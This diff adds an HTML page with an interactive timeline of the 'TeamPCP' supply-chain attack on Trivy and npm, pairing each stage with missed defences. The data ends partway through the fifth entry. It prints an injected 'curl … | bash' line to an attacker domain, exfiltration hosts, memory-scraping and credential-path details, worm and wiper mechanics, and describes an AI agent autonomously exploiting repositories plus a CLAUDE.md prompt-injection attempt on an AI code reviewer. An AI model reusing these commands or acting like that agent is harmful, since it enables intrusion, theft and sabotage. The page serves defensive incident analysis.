@@ -1,0 +1,393 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=1600">
+<title>The TeamPCP Supply Chain Attack — Interactive Timeline</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=DM+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+:root{
+--bg:#0B1120;--card:#141D2F;--border:#1E2A42;--border-hover:#2A3A5A;
+--red:#E24B4A;--red-light:#F09595;--red-dim:#501313;--red-bg:#1A0F0F;
+--teal:#1D9E75;--teal-light:#5DCAA5;--teal-bg:#0A2E22;
+--amber:#EF9F27;--amber-bg:#2A1D08;--amber-light:#C8922A;
+--blue:#378ADD;--blue-light:#85B7EB;
+--purple:#7F77DD;--purple-dim:#26215C;
+--text:#E8E6E0;--text-sec:#9C9A92;--text-dim:#6B6A65;
+--mono:'JetBrains Mono',monospace;--sans:'DM Sans',sans-serif;
+}
+body{background:var(--bg);color:var(--text);font-family:var(--sans);overflow-x:hidden}
+.top-accent{height:3px;background:var(--red);position:sticky;top:0;z-index:100}
+
+header{max-width:1540px;margin:0 auto;padding:28px 30px 0}
+header h1{font-size:26px;font-weight:700;letter-spacing:-0.5px}
+header .sub{font-size:13px;color:var(--text-sec);margin-top:6px}
+header .meta{font-size:11px;color:var(--text-dim);margin-top:4px;font-family:var(--mono)}
+
+.band-label{max-width:1540px;margin:0 auto;padding:0 30px;display:flex;align-items:center;gap:12px;margin-top:32px;margin-bottom:10px}
+.band-label span{font-size:10px;font-weight:600;letter-spacing:0.5px;white-space:nowrap}
+.band-label .line{flex:1;height:1px;opacity:0.3}
+.band-label.red span{color:var(--red)}.band-label.red .line{background:var(--red)}
+.band-label.teal span{color:var(--teal)}.band-label.teal .line{background:var(--teal)}
+.band-label.amber span{color:var(--amber)}.band-label.amber .line{background:var(--amber)}
+
+.chain{max-width:1540px;margin:0 auto;padding:0 30px;display:flex;gap:0;align-items:stretch;position:relative}
+.arrow-gap{width:22px;min-width:22px;display:flex;align-items:center;justify-content:center;position:relative}
+.arrow-gap svg{width:16px;height:16px}
+
+.node{flex:1;min-width:0;background:var(--card);border:1px solid var(--border);border-radius:8px;cursor:pointer;transition:border-color 0.2s,box-shadow 0.2s;position:relative;overflow:hidden}
+.node:hover{border-color:var(--border-hover);box-shadow:0 0 20px rgba(226,75,74,0.08)}
+.node.expanded{border-color:var(--red);box-shadow:0 0 30px rgba(226,75,74,0.12)}
+
+.node-header{padding:10px 10px 8px;border-bottom:1px solid var(--border)}
+.node-num{display:inline-flex;align-items:center;justify-content:center;width:20px;height:20px;border-radius:50%;background:rgba(226,75,74,0.12);color:var(--red);font-size:11px;font-weight:700;margin-right:6px;vertical-align:middle}
+.node-title{font-size:11px;font-weight:600;vertical-align:middle}
+.node-date{font-size:9px;color:var(--text-dim);margin-top:6px;display:block}
+.node-actor{font-size:9px;color:var(--amber);font-weight:500;margin-top:2px;display:block}
+
+.node-compact{padding:10px}
+.section-label{font-size:7px;font-weight:600;letter-spacing:0.5px;text-transform:uppercase;margin-bottom:4px;display:block}
+.section-label.dim{color:var(--text-dim)}
+.section-label.blue{color:var(--blue)}
+.section-label.red{color:var(--red)}
+.section-text{font-size:9px;line-height:1.5;margin-bottom:8px}
+.section-text.sec{color:var(--text-sec)}
+.section-text.blue{color:var(--blue-light)}
+.section-text.red{color:var(--red-light)}
+
+.node-detail{display:none;padding:12px 10px;border-top:1px solid var(--border);background:rgba(11,17,32,0.5)}
+.node.expanded .node-detail{display:block}
+.detail-section{margin-bottom:12px}
+.detail-section:last-child{margin-bottom:0}
+.detail-label{font-size:8px;font-weight:600;letter-spacing:0.5px;text-transform:uppercase;margin-bottom:4px;color:var(--text-dim)}
+.detail-label.red{color:var(--red)}
+.detail-label.blue{color:var(--blue)}
+.detail-label.amber{color:var(--amber)}
+.detail-label.teal{color:var(--teal)}
+.detail-text{font-size:10px;line-height:1.6;color:var(--text-sec)}
+.detail-text strong{color:var(--text);font-weight:500}
+.detail-text.red{color:var(--red-light)}
+.detail-text.blue{color:var(--blue-light)}
+.detail-text.amber{color:var(--amber-light)}
+.detail-text.teal{color:var(--teal-light)}
+
+.sep{height:1px;background:var(--border);margin:8px 0}
+
+.click-hint{font-size:7px;color:var(--text-dim);text-align:center;padding:6px 0;letter-spacing:0.3px;transition:opacity 0.2s}
+.node.expanded .click-hint{opacity:0.3}
+
+/* Band 2 */
+.mitigation-node{flex:1;min-width:0;background:var(--teal-bg);border:1px solid var(--teal);border-radius:6px;cursor:pointer;transition:border-color 0.2s,box-shadow 0.2s;overflow:hidden;opacity:0.85}
+.mitigation-node:hover{opacity:1;box-shadow:0 0 15px rgba(29,158,117,0.1)}
+.mitigation-node.expanded{opacity:1;border-color:var(--teal-light);box-shadow:0 0 20px rgba(29,158,117,0.15)}
+.mit-header{padding:8px 10px;border-bottom:1px solid rgba(29,158,117,0.2)}
+.mit-title{font-size:10px;font-weight:600;color:var(--teal-light)}
+.mit-pct{font-size:9px;font-weight:700;color:var(--teal);margin-top:3px}
+.mit-compact{padding:10px;font-size:9px;line-height:1.5;color:var(--teal-light)}
+.mit-detail{display:none;padding:10px;border-top:1px solid rgba(29,158,117,0.2);background:rgba(4,52,44,0.3)}
+.mitigation-node.expanded .mit-detail{display:block}
+.mit-detail-text{font-size:10px;line-height:1.6;color:var(--teal-light)}
+
+/* Connectors */
+.connectors{max-width:1540px;margin:0 auto;padding:0 30px;display:flex;gap:22px;height:28px}
+.connector-line{flex:1;display:flex;justify-content:center}
+.connector-line svg{height:28px;width:2px}
+
+/* Band 3: Chart */
+.chart-wrap{max-width:1540px;margin:0 auto;padding:0 30px;margin-top:10px}
+.chart-container{background:var(--card);border:1px solid var(--border);border-radius:8px;padding:16px 20px 12px;position:relative}
+.chart-legend{display:flex;gap:24px;margin-bottom:12px;font-size:9px;color:var(--text-dim)}
+.chart-legend .swatch{display:inline-block;width:16px;height:2px;vertical-align:middle;margin-right:4px;border-radius:1px}
+.chart-svg{width:100%;display:block}
+
+/* Footer */
+.summary{max-width:1540px;margin:32px auto 0;padding:0 30px}
+.summary-box{background:var(--card);border:1px solid var(--red);border-radius:6px;padding:16px 18px;border-left:3px solid var(--red);opacity:0.85}
+.summary-box p{font-size:11px;line-height:1.6;color:var(--text-sec);margin-bottom:6px}
+.summary-box p:last-child{margin-bottom:0}
+.summary-box p.highlight{color:var(--text);font-weight:500}
+.summary-box p.teal{color:var(--teal);font-weight:500}
+
+.stats{max-width:1540px;margin:16px auto 0;padding:0 30px;display:flex;gap:10px}
+.stat{flex:1;background:var(--card);border:1px solid var(--border);border-radius:6px;padding:10px;text-align:center}
+.stat-val{font-size:18px;font-weight:700;color:var(--red);font-family:var(--mono)}
+.stat-label{font-size:8px;color:var(--text-sec);margin-top:2px}
+
+.footer-credit{text-align:center;font-size:8px;color:var(--text-dim);padding:16px 0 24px;font-family:var(--mono)}
+
+@keyframes fadeIn{from{opacity:0;transform:translateY(6px)}to{opacity:1;transform:translateY(0)}}
+.node,.mitigation-node{animation:fadeIn 0.4s ease both}
+.chain .node:nth-child(1){animation-delay:0.05s}
+.chain .node:nth-child(3){animation-delay:0.1s}
+.chain .node:nth-child(5){animation-delay:0.15s}
+.chain .node:nth-child(7){animation-delay:0.2s}
+.chain .node:nth-child(9){animation-delay:0.25s}
+.chain .node:nth-child(11){animation-delay:0.3s}
+.chain .node:nth-child(13){animation-delay:0.35s}
+</style>
+</head>
+<body>
+<div class="top-accent"></div>
+<header>
+<h1>THE TEAMPCP SUPPLY CHAIN ATTACK</h1>
+<div class="sub">An OpenClaw AI agent started everything. Known AppSec practices could have stopped it at every step.</div>
+<div class="meta">February 20 – March 24, 2026 &nbsp;|&nbsp; 5 ecosystems &nbsp;|&nbsp; 1,000+ compromised SaaS environments &nbsp;|&nbsp; 33 days &nbsp;|&nbsp; CVE-2026-33634 (CVSS 9.4)</div>
+</header>
+
+<div class="band-label red"><span>ATTACK CHAIN</span><div class="line"></div><span style="font-weight:400;opacity:0.5">Click any card for full details</span></div>
+
+<div class="chain" id="band1"></div>
+
+<div class="connectors" id="connectors"></div>
+
+<div class="band-label teal"><span>WHAT WOULD HAVE STOPPED THIS (KNOWN APPSEC PRACTICES, NOT IMPLEMENTED)</span><div class="line"></div></div>
+
+<div class="chain" id="band2"></div>
+
+<div class="band-label amber"><span>DEVELOPER AWARENESS + COMPROMISED ENVIRONMENTS OVER TIME</span><div class="line"></div></div>
+
+<div class="chart-wrap">
+<div class="chart-container">
+<div class="chart-legend">
+<span><span class="swatch" style="background:var(--text-dim)"></span>Developer awareness</span>
+<span><span class="swatch" style="background:var(--red)"></span>Compromised environments (cumulative)</span>
+<span><span class="swatch" style="background:var(--amber);height:3px"></span>Karpathy awareness spike</span>
+</div>
+<svg class="chart-svg" viewBox="0 0 1480 220" id="chartSvg"></svg>
+</div>
+</div>
+
+<div class="summary">
+<div class="summary-box">
+<p>33 days of security advisories from Wiz, Socket, StepSecurity, Aikido, Sysdig, CrowdStrike, and Microsoft. CVE-2026-33634 assigned (CVSS 9.4). Mandiant confirms 1,000+ compromised SaaS environments at RSAC 2026, projecting expansion to 10,000+.</p>
+<p class="highlight">None of it registered with the broader AI developer community until one AI thought leader reframed it as an AI problem.</p>
+<p class="teal">The practices that would have prevented 70–100% of this attack chain have existed for years. SHA pinning since 2020. OIDC trusted publishing since 2023. Credential rotation since the beginning of time.</p>
+</div>
+</div>
+
+<div class="stats">
+<div class="stat"><div class="stat-val">5</div><div class="stat-label">ecosystems hit</div></div>
+<div class="stat"><div class="stat-val">1,000+</div><div class="stat-label">environments compromised</div></div>
+<div class="stat"><div class="stat-val">95M/mo</div><div class="stat-label">LiteLLM downloads</div></div>
+<div class="stat"><div class="stat-val">33 days</div><div class="stat-label">7 cascading compromises</div></div>
+<div class="stat"><div class="stat-val">70–100%</div><div class="stat-label">preventable with known AppSec</div></div>
+</div>
+
+<div class="footer-credit">Data: Wiz, Socket, Aikido, Sysdig, Endor Labs, StepSecurity, Snyk, BleepingComputer, Mandiant, Microsoft &nbsp;|&nbsp; March 24, 2026</div>
+
+<script>
+const DATA = [
+{num:"1",title:"PWN REQUEST",date:"Feb 20–28, 2026",actor:"hackerbot-claw (OpenClaw agent)",
+vector:"Misconfigured pull_request_target GitHub Actions workflow",
+desc:"OpenClaw AI agent autonomously scans 47,391 repos using 9 vulnerability classes and 47 sub-patterns. Identifies and exploits the misconfiguration in Trivy\u2019s CI. Achieves RCE and exfiltrates PAT within 19 minutes.",
+users:"7 repos targeted (Microsoft, DataDog, CNCF, Trivy 32K stars, awesome-go 140K stars). RCE achieved in 4 of 7 targets.",
+stolen:"aqua-bot PAT with repo scope across entire aquasecurity GitHub org. All 178 releases deleted. Malicious VS Code extension published to OpenVSX.",
+fullTechnique:"The hackerbot-claw account was created on February 20, 2026. It described itself as an \u201cautonomous security research agent powered by Claude Opus 4.5.\u201d It maintained a vulnerability pattern index with 9 classes and 47 sub-patterns, and autonomously scanned, verified, and deployed proof-of-concept exploits. The bot used 5 different exploitation techniques across 7 targets, each customized to the specific workflow configuration.\n\nTrivy had a GitHub Actions workflow called \u201cAPI Diff Check\u201d (apidiff.yaml) that used the pull_request_target trigger \u2014 a well-documented footgun where the workflow runs with the base repository\u2019s secrets but can be tricked into checking out and executing code from a fork\u2019s pull request. The bot opened PR #10254, injected a Go init() function into the quality check script, and the workflow executed: curl -sSfL hackmoltrepeat.com/molt | bash. The payload used /proc/<pid>/mem memory dumping to extract the aqua-bot service account\u2019s PAT (a token with repo scope across the entire aquasecurity GitHub organization).\n\nWithin 19 minutes of exploitation, the stolen PAT was active. The attacker deleted all 178 GitHub releases, renamed the repository, stripped all 32,000+ stars, and pushed a malicious VS Code extension to the OpenVSX marketplace. Seven major repos were targeted in the same campaign, including Microsoft/ai-discovery-agent, DataDog/datadog-iac-scanner, avelino/awesome-go (140K stars), ambient-code/platform, project-akri/akri (CNCF), and RustPython (20K stars).\n\nNotably, in one target (ambient-code/platform), hackerbot-claw attempted to compromise a CI pipeline by replacing the repository\u2019s CLAUDE.md file with malicious instructions designed to make Claude (running as a code reviewer) inject unauthorized code. Claude identified the prompt injection and refused to comply \u2014 the first documented instance of AI-vs-AI defense in CI/CD.",
+fullUsers:"The primary target was aquasecurity/trivy \u2014 the most widely used open-source vulnerability scanner in the cloud-native ecosystem, with 32,000+ GitHub stars and over 100 million Docker Hub pulls. Trivy is integrated into thousands of CI/CD pipelines globally and is used to scan Docker container images, Kubernetes manifests, and source code for vulnerabilities.\n\nThe other targets included repositories from Microsoft, DataDog, the CNCF, and major open-source projects with combined stars exceeding 200,000. RCE was achieved in at least 4 of 7 targets. Assessment from Pillar Security: \u201cThis is a human operator using an LLM as an execution layer. The operator selected targets, defined technique classes, and made real-time strategic decisions. The AI generated payloads, created PRs, and handled rapid iteration.\u201d\n\nRepello AI attributed hackerbot-claw directly to TeamPCP based on metadata analysis, describing it as \u201ca single-person operation running a structured nine-phase attack campaign with distinct objectives at each stage.\u201d",
+fullStolen:"The aqua-bot service account PAT had repo scope across the entire aquasecurity GitHub organization. With this single credential, the attacker:\n\n\u2022 Deleted all 178 GitHub releases\n\u2022 Renamed the repository to aquasecurity/private-trivy and pushed an empty replacement\n\u2022 Stripped all 32,000+ stars\n\u2022 Published a malicious VS Code extension to the OpenVSX marketplace containing a credential stealer with a 2,000-word AI agent manipulation prompt\n\u2022 Compromised the aqua-bot service account to push malicious workflows to tfsec, traceeshark, and trivy-action\n\u2022 Stole additional credentials including GPG keys and credentials for Docker Hub, Twitter, and Slack\n\nAll exfiltrated data was sent to hackmoltrepeat.com and recv.hackmoltrepeat.com, domains registered on February 24, three days after the campaign began.",
+at:"Secure workflow configuration",pct:"80%",
+ad:"pull_request_target is a documented footgun since 2020. GitHub Security Lab published \u2018Preventing Pwn Requests.\u2019 OpenSSF Scorecard flags this automatically. GitHub changed defaults Dec 2025. Trivy\u2019s vulnerable workflow present since Oct 2025, never patched. Least-privilege token scoping and CI/CD egress monitoring (StepSecurity Harden-Runner) both existed and were not used.",
+fullAd:"The pull_request_target workflow trigger has been documented as dangerous since GitHub Security Lab\u2019s 2020 publication \u201cKeeping your GitHub Actions and workflows secure: Preventing pwn requests.\u201d The OpenSSF Scorecard project automatically flags this pattern in public repositories. Despite this, the vulnerable apidiff.yaml workflow was added to the Trivy repository in October 2025 and remained unpatched through the attack.\n\nGitHub changed the default behavior of pull_request_target workflows in December 2025 to reduce exploitation risk, but the Trivy workflow predated this change. StepSecurity\u2019s Harden-Runner, available for free on public repositories and used by over 12,000 repos, would have detected the anomalous outbound connection to hackmoltrepeat.com during the CI run.\n\nThe aqua-bot PAT had repo scope across the entire organization. GitHub\u2019s own documentation recommends using fine-grained personal access tokens scoped to specific repositories, or GitHub App installation tokens with minimum required permissions. OIDC-based authentication (available since 2021) eliminates the need for stored PATs entirely.\n\nEvery mitigation listed here existed before the attack. The vulnerability was not in the tooling \u2014 it was in the decision not to use it."},
+{num:"2",title:"FAILED ROTATION",date:"March 1, 2026",actor:"Aqua Security (IR failure)",
+vector:"Incomplete credential rotation after known breach",
+desc:"Aqua discloses Feb breach and executes credential rotation. Rotation is not comprehensive. The Argon-DevOps-Mgt service account, a bot bridging two GitHub orgs with a long-lived PAT, retains valid access to both organizations.",
+users:"No new direct victims. But residual access enables every subsequent compromise in the entire chain.",
+stolen:"Nothing new stolen. The attacker retains the key that unlocks everything that follows.",
+fullTechnique:"On March 1, 2026, the Trivy team disclosed the February incident (GitHub Discussion #10265) and executed credential rotation. The team revoked the compromised aqua-bot PAT, removed the malicious VS Code extension from OpenVSX, released Trivy v0.69.2, and removed the vulnerable apidiff.yaml workflow.\n\nHowever, subsequent investigation revealed the rotation was not fully comprehensive. The Argon-DevOps-Mgt service account \u2014 a single bot account bridging the \u201caquasecurity\u201d and \u201caquasec-com\u201d GitHub organizations with a long-lived PAT \u2014 was not included in the rotation. This account retained valid write access to both organizations.\n\nAs OpenSourceMalware later documented: \u201cA credential harvested during the Trivy GitHub Actions compromise months ago was weaponized today to deface an entire internal GitHub organization. The Argon-DevOps-Mgt service account \u2014 a single bot account bridging two orgs with a long-lived PAT \u2014 was the weak link.\u201d\n\nWiz Research confirmed: \u201cThe attack was conducted with access retained following incomplete containment of the earlier incident.\u201d",
+fullUsers:"While no new systems were directly compromised at this stage, the incomplete rotation created the conditions for every subsequent node in the attack chain. The residual access enabled:\n\n\u2022 Node 3: Force-pushing 76/77 trivy-action tags and publishing backdoored Trivy v0.69.4\n\u2022 Node 5: Defacing all 44 internal aquasec-com repositories\n\u2022 Node 5: Publishing malicious Docker images to Docker Hub\n\nEvery credential stolen in Nodes 3\u20137 traces back to this single unrotated service account.",
+fullStolen:"No new credentials were stolen at this stage. The significance is entirely in what was preserved: the Argon-DevOps-Mgt PAT that bridged two GitHub organizations. This single credential became the master key for the entire subsequent campaign.",
+at:"Incident response fundamentals",pct:"100%",
+ad:"Complete credential rotation after breach is IR 101. Every credential potentially exposed must be rotated atomically. Long-lived PATs should be replaced with short-lived OIDC tokens or GitHub App installation tokens. Service account inventory and blast-radius mapping is standard hygiene. Post-rotation verification testing should confirm old credentials are invalidated. None of this was done.",
+fullAd:"This is the only node in the chain where the preventability is 100%. Every practice that would have stopped this has existed for decades and requires no specialized tooling:\n\n1. Complete credential inventory: After any breach, enumerate every credential that could have been exposed, including service accounts, bot tokens, and automation credentials. The Argon-DevOps-Mgt account was a cross-org service account \u2014 exactly the kind of high-privilege credential that should be first in line for rotation.\n\n2. Atomic rotation: All potentially exposed credentials must be rotated simultaneously. Partial rotation \u2014 rotating some credentials while leaving others valid \u2014 is not rotation.\n\n3. Short-lived credentials: Long-lived PATs stored as organization secrets should be replaced with short-lived OIDC tokens or GitHub App installation tokens that expire automatically. GitHub has supported OIDC for Actions since 2021.\n\n4. Verification testing: After rotation, verify that the old credentials are actually invalidated. Red-team your own rotation by attempting to use the old credentials.\n\n5. Blast-radius mapping: Before returning the environment to operation, document which systems each credential can reach. A cross-org service account should have been identified as a critical path during this analysis.\n\nAqua Security\u2019s formal update on March 23 stated the investigation is \u201cactively focused on validating that all access paths have been identified and fully closed.\u201d This statement was made 22 days after the initial rotation attempt."},
+{num:"3",title:"TRIVY WEAPONIZED",date:"March 19, 2026",actor:"TeamPCP",
+vector:"Mutable GitHub Actions version tags (force-push)",
+desc:"Using residual credentials, force-pushes 76/77 trivy-action tags and all 7 setup-trivy tags to malicious commits. Spoofs original commit metadata. Publishes backdoored v0.69.4 binary to GitHub Releases, Docker Hub, GHCR, ECR.",
+users:"10,000+ GitHub workflows reference trivy-action. 45 prominent repos confirmed compromised. Trivy: 32K stars, 100M+ Docker pulls. CVE-2026-33634 (CVSS 9.4).",
+stolen:"CI/CD runner memory dumps. SSH keys. AWS/GCP/Azure creds. K8s tokens. npm publish tokens. Docker tokens. Crypto wallets. 50+ credential paths swept.",
+fullTechnique:"At 17:43:37 UTC on March 19, TeamPCP leveraged the retained credentials from the incomplete rotation to execute the main strike. The attack had three simultaneous components:\n\n1. Trivy binary poisoning: The attacker pushed commit 1885610c that swapped the actions/checkout reference to an imposter commit (70379aad) containing a composite action that downloaded malicious Go source files from a typosquatted domain (scan.aquasecurtiy[.]org, note the typo). They added --skip=validate to goreleaser to bypass binary validation, then tagged this commit as v0.69.4, triggering the release pipeline. Backdoored binaries were published to GitHub Releases, Docker Hub, GHCR, and ECR.\n\n2. trivy-action tag poisoning: 75 of 76 version tags were force-pushed to malicious commits. Each forged commit cloned the original commit\u2019s metadata (author name, email, committer, timestamps, full commit message including PR references). The only clean tag was 0.35.0 (protected by GitHub\u2019s immutable releases feature). The payload ran before the legitimate Trivy scan, so pipelines appeared normal.\n\n3. setup-trivy tag poisoning: All 7 tags were force-pushed in the same manner.\n\nThe malicious payload was a three-stage credential stealer self-described as \u201cTeamPCP Cloud stealer\u201d:\n\u2022 Stage 1 (Collection): Scraped memory from the Runner.Worker process by reading /proc/<pid>/mem, searching for the pattern {\"value\":\"<secret>\",\"isSecret\":true}. Swept the filesystem for credentials across 50+ sensitive file paths.\n\u2022 Stage 2 (Encryption): Encrypted collected data using AES-256-CBC with RSA-4096.\n\u2022 Stage 3 (Exfiltration): Posted encrypted data to scan.aquasecurtiy[.]org (45.148.10.212). Fallback: created a public repository named tpcp-docs on the victim\u2019s own GitHub account, uploaded encrypted data as a release asset.\n\nExposure windows:\n\u2022 trivy v0.69.4: 18:22\u201321:42 UTC March 19 (~3 hours)\n\u2022 trivy-action: 17:43 UTC March 19 \u2013 05:40 UTC March 20 (~12 hours)\n\u2022 setup-trivy: 17:43\u201321:44 UTC March 19 (~4 hours)",
+fullUsers:"Over 10,000 GitHub workflow files reference trivy-action. StepSecurity analyzed 767 prominent public repositories and confirmed that 45 had at least one workflow run that used a compromised version during the exposure window. This analysis only covered repositories with 100+ stars \u2014 the total number of affected workflows, including private repositories, is unknown but significantly higher.\n\nTrivy has 32,000+ GitHub stars and over 100 million Docker Hub pulls. It is used by enterprises, open-source projects, and CI/CD pipelines worldwide for vulnerability scanning of container images, Kubernetes manifests, and source code.\n\nThe attack is tracked under CVE-2026-33634 with a CVSS score of 9.4. CrowdStrike, Microsoft, Wiz, Socket, StepSecurity, and Sysdig all published technical analyses.",
+fullStolen:"The stealer targeted:\n\u2022 Runner.Worker process memory (extracting masked secrets)\n\u2022 SSH keys (~/.ssh/)\n\u2022 AWS credentials (~/.aws/credentials, environment variables)\n\u2022 GCP credentials (~/.config/gcloud/)\n\u2022 Azure credentials (~/.azure/)\n\u2022 Kubernetes tokens (~/.kube/config, service account tokens)\n\u2022 npm tokens (~/.npmrc, NPM_TOKEN)\n\u2022 Docker credentials (~/.docker/config.json)\n\u2022 Cryptocurrency wallets (Solana validator keypairs emphasized)\n\u2022 Git credentials\n\u2022 .env files\n\u2022 Shell history\n\u2022 SSL private keys\n\nBeyond cloud credentials, the payload placed heavy emphasis on Solana validator keypairs and cryptocurrency wallets. The stolen npm tokens became the launch pad for CanisterWorm less than 24 hours later.",
+at:"SHA pinning for GitHub Actions",pct:"90%",
+ad:"Pinning actions to full 40-char commit SHAs is the only way to use an action as an immutable release. Documented since 2020. GitHub org-level enforcement policies existed since Aug 2025. Immutable releases introduced same month. GPG commit signing would have flagged unsigned imposter commits. CI/CD egress monitoring would have caught the typosquatted C2 domain. Zero of 10,000+ affected workflows used SHA pinning.",
+fullAd:"GitHub\u2019s own security documentation states: \u201cPinning an action to a full-length commit SHA is currently the only way to use an action as an immutable release.\u201d This has been documented since 2020.\n\nIn August 2025, GitHub introduced two features that directly address this:\n1. Organization-level policies to require all actions to be pinned to full-length commit SHAs\n2. Immutable releases, where a release\u2019s assets and Git tag cannot be changed or deleted\n\nThe sole uncompromised trivy-action tag (0.35.0) was protected by immutable releases. Every other tag was vulnerable because immutable releases were not enabled for them.\n\nAdditional mitigations:\n\u2022 GPG commit signing: The original Trivy commits were GPG-signed by GitHub\u2019s web-flow. The malicious replacement commits were unsigned. Any verification step checking for signatures would have flagged the discrepancy.\n\u2022 Timestamp analysis: The forged commits had dates from 2021\u20132024 but parent commits from March 2026 \u2014 an impossible timeline that automated analysis would catch.\n\u2022 CI/CD egress monitoring: StepSecurity Harden-Runner detected the compromised trivy-action making anomalous outbound connections to scan.aquasecurtiy[.]org across multiple open-source projects.\n\nTools like StepSecurity\u2019s Piñata can automatically pin GitHub Actions to commit SHAs and create pull requests to update them. Dependabot supports SHA-pinned action updates. The tooling exists. Zero of the 10,000+ affected workflows used it."},
+{num:"4",title:"CANISTERWORM",date:"March 20, 2026",actor:"TeamPCP",
+vector:"Stolen npm publish tokens + postinstall hooks",
+desc:"Stolen npm tokens from Node 3 fed to an AI-generated (vibe-coded) self-propagating worm. deploy.js iterates every package each token can publish to, bumps patch version, preserves README, publishes. Persistence via systemd masquerading as PostgreSQL.",
+users:"66+ unique npm packages, 141+ malicious artifacts. Scopes: @EmilGroup, @opengov, @teale.io, @airtm, @pypestream. Every infected dev/CI pipeline becomes a propagation vector.",
+stolen:"Additional npm tokens (self-replicating). System credentials. Persistent backdoor polling ICP blockchain canister C2 (takedown-resistant).",
+fullTechnique:"On March 20, 2026 at 20:45 UTC, Aikido Security detected dozens of npm packages receiving unauthorized patch updates containing identical malicious code. The worm, named CanisterWorm, was deployed using npm tokens stolen during the Trivy compromise.\n\nThe worm\u2019s deploy.js propagation script:\n\u2022 Supports multiple tokens (reads NPM_TOKENS comma-separated)\n\u2022 Resolves each token\u2019s identity via npm /-/whoami\n\u2022 Enumerates every package the account can publish to via search API\n\u2022 Bumps the patch version automatically (1.54.0 \u2192 1.54.1)\n\u2022 Preserves the original README (fetches and swaps before publishing)\n\u2022 Rewrites package.json on the fly\n\u2022 Publishes with --tag latest\n\nThe worm was assessed by multiple researchers as \u201cvibe-coded\u201d \u2014 generated using AI tools with no attempt at obfuscation. It was self-explanatory and made no effort to conceal functionality.\n\nThe malicious payload (postinstall hook):\n\u2022 Decodes a base64-encoded Python script\n\u2022 Writes it to ~/.local/share/pgmon/service.py\n\u2022 Creates a systemd user service (pgmon.service) with Restart=always and 5-second restart delay\n\u2022 The Python backdoor polls an ICP canister (tdtqy-oyaaa-aaaae-af2dq-cai) as a dead-drop C2\n\u2022 Retrieves a URL from the canister and downloads/executes the payload\n\u2022 At time of analysis, the URL returned a Rick Roll YouTube video (kill switch)\n\nThis was the first publicly documented abuse of an Internet Computer Protocol (ICP) canister for C2 purposes. Because ICP is a decentralized blockchain network, the C2 has no single hosting provider, no registrar, and no conventional takedown point.",
+fullUsers:"As of March 21, Socket tracked 135 malicious package artifacts spanning more than 64 unique packages. Later reporting expanded this to 141+ artifacts across 66+ packages. Affected scopes included @EmilGroup (28 packages), @opengov (16+ packages), @teale.io, @airtm, and @pypestream.\n\nAn upgraded variant in @teale.io/eslint-config added a findNpmTokens() function that harvests npm tokens from .npmrc files, environment variables, and npm config during postinstall \u2014 making every compromised developer or CI pipeline an unwitting propagation vector.\n\nEndor Labs characterized the pattern: \u201cWhile credential harvesting via postinstall hooks is a well-established tactic, this proved that stolen npm tokens could be immediately weaponized to infect and republish a victim\u2019s own packages, turning a single compromise into an exponentially expanding attack.\u201d\n\nSocket reported: \u201cThis is the point where the attack goes from \u2018compromised account publishes malware\u2019 to \u2018malware compromises more accounts and publishes itself.\u2019\u201d",
+fullStolen:"Primary theft:\n\u2022 npm authentication tokens from .npmrc files, environment variables, and npm config\n\u2022 System credentials via the PostgreSQL-masquerading backdoor\n\nThe persistent backdoor (pgmon.service) polls the ICP canister C2 every 50 minutes for new payloads. The canister controller can swap the URL at any time, pushing new binaries to all infected hosts without touching the implant. All artifacts were named to blend in on developer machines: pgmon, pglog, .pg_state.\n\nThe ICP canister was eventually marked \u201cUnavailable Due to Policy Violation\u201d at 21:31 UTC, but this required extended coordination with the Internet Computer foundation and is not a repeatable or guaranteed enforcement mechanism.",
+at:"OIDC trusted publishing for npm",pct:"75%",
+ad:"npm trusted publishing (OIDC) eliminates long-lived tokens entirely. Available since 2024. Short-lived OIDC tokens scoped to specific workflow runs expire in minutes. Stolen tokens would have been useless. Package lockfiles with integrity hashes prevent pulling bumped malicious patches. Provenance attestation cryptographically links packages to source commits. All existed. Adoption was near zero.",
+fullAd:"npm\u2019s Trusted Publishing feature, based on OpenID Connect (OIDC), was introduced as part of the OpenSSF Trusted Publishers initiative. It creates a trust relationship between npm and your CI/CD provider: when configured, your workflow requests a short-lived token from npm at publish time, scoped to that specific workflow run. No long-lived token is ever stored.\n\nIf any of the compromised package maintainers had used Trusted Publishing:\n\u2022 There would be no npm token stored in CI/CD secrets to steal\n\u2022 The stolen Trivy pipeline credentials would not include any npm publish capability\n\u2022 The worm\u2019s deploy.js would have no valid tokens to use\n\nAdditional mitigations:\n\u2022 Package lockfiles (package-lock.json, yarn.lock) with integrity hashes: Consumers with locked dependencies would not have pulled the bumped malicious versions because the hash would not match.\n\u2022 npm provenance attestations: When publishing with Trusted Publishing from GitHub Actions, npm automatically generates provenance attestations linking each package to its source commit. Packages published without provenance (as all the malicious versions were) could be flagged.\n\u2022 The \u201cdisallow tokens\u201d setting on npmjs.com: Package maintainers can restrict their packages to only accept Trusted Publisher authentication, making long-lived token theft entirely irrelevant.\n\nPyPI has offered Trusted Publishing since 2023. npm followed in 2024. Both are free. Adoption remains negligible across the ecosystem."},
+{num:"5",title:"WIPER + DEFACEMENT",date:"March 22, 2026",actor:"TeamPCP",
+vector:"Mutable Docker tags + unrotated service account PAT",
+desc:"Three concurrent attacks: (a) Malicious Trivy images 0.69.5/0.69.6 pushed to Docker Hub. (b) All 44 internal aquasec-com repos defaced in 2-min scripted burst. (c) kamikaze.sh deploys Iran-targeted K8s wiper via privileged DaemonSets.",
+users:"Docker Hub users pulling latest Trivy. Aqua internal org: Tracee source, K8s operators, CI/CD configs exposed. Iranian K8s clusters targeted for total destruction. Non-Iranian clusters get persistent backdoor.",
+stolen:"Internal source code exposed. Docker supply chain poisoned. Iranian hosts: rm -rf /. K8s clusters: every node wiped and force-rebooted via kamikaze container.",
